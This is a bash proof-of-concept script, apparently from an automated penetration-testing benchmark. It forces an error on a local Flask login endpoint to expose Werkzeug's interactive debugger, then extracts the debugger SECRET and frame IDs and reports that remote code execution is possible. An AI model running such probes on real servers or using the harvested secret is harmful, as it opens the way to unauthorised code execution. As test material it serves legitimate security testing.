#!/bin/bash
# POC: POC demonstrating exposed Werkzeug debugger with interactive console and RCE capability by triggering an error and detecting EVALEX, SECRET, and debugger components
# Target: ./repo
# Created: 2025-10-31T16:48:37.277Z
# Session: benchmark-XBEN-032-24-mhf2utzd

echo "=========================================="
echo "Werkzeug Debugger RCE POC"
echo "=========================================="
echo ""

TARGET="http://localhost:8080"

echo "[*] Step 1: Triggering an error to expose Werkzeug debugger..."
echo "[*] Sending JSON to /login (expects form data) to trigger error..."
echo ""

RESPONSE=$(curl -s -w "\n---HTTP_CODE:%{http_code}---" -X POST "$TARGET/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"test"}')

HTTP_CODE=$(echo "$RESPONSE" | grep -o "HTTP_CODE:[0-9]*" | cut -d: -f2)
BODY=$(echo "$RESPONSE" | sed 's/---HTTP_CODE:[0-9]*---//')

echo "[+] HTTP Status Code: $HTTP_CODE"
echo ""

if [ "$HTTP_CODE" != "500" ]; then
    echo "[-] Expected HTTP 500 error, got $HTTP_CODE"
    echo "[!] Werkzeug debugger may not be active"
    exit 1
fi

echo "[*] Step 2: Analyzing response for Werkzeug debugger indicators..."
echo ""

# Check for Werkzeug debugger presence
if echo "$BODY" | grep -q "Werkzeug Debugger"; then
    echo "[+] CONFIRMED: Werkzeug Debugger page detected!"
else
    echo "[-] Werkzeug Debugger page not found"
fi

# Check for EVALEX enabled
if echo "$BODY" | grep -q "EVALEX.*true" || echo "$BODY" | grep -q "EVALEX = true"; then
    echo "[+] CRITICAL: EVALEX is enabled (interactive console active)!"
else
    echo "[?] EVALEX status unclear"
fi

# Extract the secret if present
SECRET=$(echo "$BODY" | grep -oP "SECRET\s*=\s*['\"]([^'\"]+)['\"]" | head -1 | sed -E "s/.*['\"]([^'\"]+)['\"].*/\1/")
if [ -n "$SECRET" ]; then
    echo "[+] CRITICAL: Debugger SECRET exposed: $SECRET"
else
    echo "[?] SECRET not found in response"
fi

# Check for frame IDs (interactive console frames)
if echo "$BODY" | grep -q "console.html" || echo "$BODY" | grep -q "frameID"; then
    echo "[+] Interactive console frames detected!"
fi

# Check for stack trace
if echo "$BODY" | grep -q "Traceback" || echo "$BODY" | grep -q "KeyError"; then
    echo "[+] Full stack trace exposed in response"
fi

echo ""
echo "[*] Step 3: Attempting to extract frame information..."

# Try to find frame IDs
FRAME_IDS=$(echo "$BODY" | grep -oP 'frameID=\d+' | head -3)
if [ -n "$FRAME_IDS" ]; then
    echo "[+] Found debugger frame IDs:"
    echo "$FRAME_IDS" | while read line; do
        echo "    - $line"
    done
fi

echo ""
echo "=========================================="
echo "VULNERABILITY ASSESSMENT"
echo "=========================================="

if echo "$BODY" | grep -q "Werkzeug Debugger" && [ "$HTTP_CODE" == "500" ]; then
    echo "[!] CRITICAL VULNERABILITY CONFIRMED!"
    echo ""
    echo "The application exposes Werkzeug's interactive debugger with:"
    if [ -n "$SECRET" ]; then
        echo "  - Exposed SECRET: $SECRET"
    fi
    echo "  - Interactive Python console capability"
    echo "  - Full stack traces and file paths"
    echo "  - Remote Code Execution (RCE) possible"
    echo ""
    echo "[!] An attacker can execute arbitrary Python code on the server!"
    exit 0
else
    echo "[-] Werkzeug debugger not conclusively detected"
    exit 1
fi